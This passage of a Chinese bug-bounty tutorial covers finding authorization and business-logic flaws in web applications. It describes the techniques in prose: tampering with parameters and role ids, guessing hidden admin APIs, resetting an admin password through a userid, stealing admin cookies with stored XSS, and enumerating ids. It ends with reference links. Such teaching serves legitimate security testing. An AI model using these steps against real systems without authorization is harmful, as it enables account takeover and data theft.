255);">常见手法</h5><p>1.操作时分析请求中的数据包，看看每个参数的作用，修改参数查看变化。</p><p>2.拥有更多权限的账号，把能访问的URL都提取出来，给低权限用户访问或者直接访问，查看能否访问。</p><p>3.猜测隐藏的API，如:guest/getorder，修改成admin/getorder。</p><p>4.通过搜索引擎，或者提取JS中的URL，查找隐藏功能。如burpsuite中有一个BHP JS scraper的插件。</p><p>5.猜测隐藏的参数，添加进去查看变化，如修改信息的时候加个ID。</p><p>6.抓取所有的数据包，搜索用户名等关键词，比如我的用户名是test，在burpsuite中的HTTP history搜索test，看看有没有哪个数据包包含这个参数,将其修改为其他的用户名，查看变化。</p><p><br  /></p><p><br  /></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727830007&amp;idx=1&amp;sn=9d2fc4060665ef5a494137b8db2ec02f&amp;scene=21#wechat_redirect" target="_blank" rel="noopener" style="box-sizing: inherit;background-color: transparent;color: rgb(113, 112, 219);outline: 0px;" data-linktype="2">JSRC——越权漏洞挖掘</a></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727828622&amp;idx=1&amp;sn=711ace5ba7aea944f7c4a7793cd9e8ef&amp;scene=21#wechat_redirect" target="_blank" rel="noopener" style="box-sizing: inherit;background-color: transparent;color: rgb(113, 112, 219);outline: 0px;" data-linktype="2">JSRC——聊聊越权那些事</a></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>我的越权之道</strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/drops/tips-727.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>垂直越权的手法：</strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;">1.编辑个人信息的时候，修改权限组的id，一般管理员的值为0或者1；</p><p style="box-sizing: inherit;margin-bottom: 1rem;">2.后台修改密码的地方，如果是根据userid来修改密码的，可以修改id的值来修改管理员的密码；</p><p style="box-sizing: inherit;margin-bottom: 1rem;">3.在个人资料处插入XSS脚本，一般能打到管理员cookie的概率很大；</p><p style="box-sizing: inherit;margin-bottom: 1rem;">4.查看个人资料的时候，如果是根据id来显示，一般都有越权，可以遍历id获取管理员信息；</p><p style="box-sizing: inherit;margin-bottom: 1rem;">5.测试后台功能，找一下注入、上传、命令执行等漏洞，直接拿下数据库权限或者shell，再找管理员权限就轻而易举了。</p><h3 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;font-size: 1.25rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: center;white-space: normal;background-color: rgb(255, 255, 255);"><img data-type="png" data-ratio="0.109375" data-w="640" src="图片/HACK学习呀_2020-02-18_SRC逻辑漏洞挖掘详解以及思路和技巧/12_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);visibility: visible !important;width: 640px !important;"  />其他资料</h3><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: center;white-space: normal;background-color: rgb(255, 255, 255);"><strong>业务逻辑漏洞总结</strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: center;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://github.com/PyxYuYu/MyBlog/issues/102</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: center;white-space: normal;background-color: rgb(255, 255, 255);"><a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727829839&amp;idx=1&amp;sn=ac877ef8ea3346c1cc09d9bb568cb01d&amp;scene=21#wechat_redirect" target="_blank" rel="noopener" style="box-sizing: inherit;background-color: transparent;color: rgb(113, 112, 219);outline: 0px;" data-linktype="2">JSRC——业务逻辑漏洞挖掘</a></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: center;white-space: normal;background-color: rgb(255, 255, 255);"><a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727827735&amp;idx=1&amp;sn=a9ffeacb343701aa115c0a6596174fd6&amp;scene=21#wechat_redirect" target="_blank" rel="noopener" style="box-sizing: inherit;background-color: transparent;color: rgb(113, 112, 219);outline: 0px;" data-linktype="2">JSRC——交易支付漏洞挖掘</a></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: center;white-space: normal;background-color: rgb(255, 255, 255);"><a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727828953&amp;idx=2&amp;sn=091fb0e24940ccb0c6d85bc172c852ca&amp;scene=21#wechat_redirect" target="_blank" rel="noopener" style="box-sizing: inherit;background-color: transparent;color: rgb(113, 112, 219);outline: 0px;" data-linktype="2">JSRC——Web漏洞之逻辑漏洞挖掘</a></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: center;white-space: normal;background-color: rgb(255, 255, 255);"><a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727832089&amp;idx=1&amp;sn=fb15a15bad60a42fe8ae11345a0e328c&amp;scene=21#wechat_redirect" target="_blank" rel="noopener" style="box-sizing: inherit;background-color: transparent;color: rgb(113, 112, 219);outline: 0px;" data-linktype="2">JSRC——批量Web漏洞挖掘</a></p><h2 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;font-size: 1.5rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: center;white-space: normal;background-color: rgb(255, 255, 255);">Reference</h2><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: center;white-space: normal;background-color: rgb(255, 255, 255);"><strong>[红日安全]Web安全Day6 - 业务逻辑漏洞实战攻防</strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: center;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://xz.aliyun.com/t/6401#toc-5</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: center;white-space: normal;background-color: rgb(255, 255, 255);">密码找回逻辑漏洞总结</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: center;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">http://bobao.360.cn/learning/detail/287.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: center;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;"><br  /></span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: right;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">参考来源：Ca01H's Blog</span></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2020-02-18_SRC逻辑漏洞挖掘详解以及思路和技巧/13_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style=""  /></p>
                </div>
</div>
</body>
</html>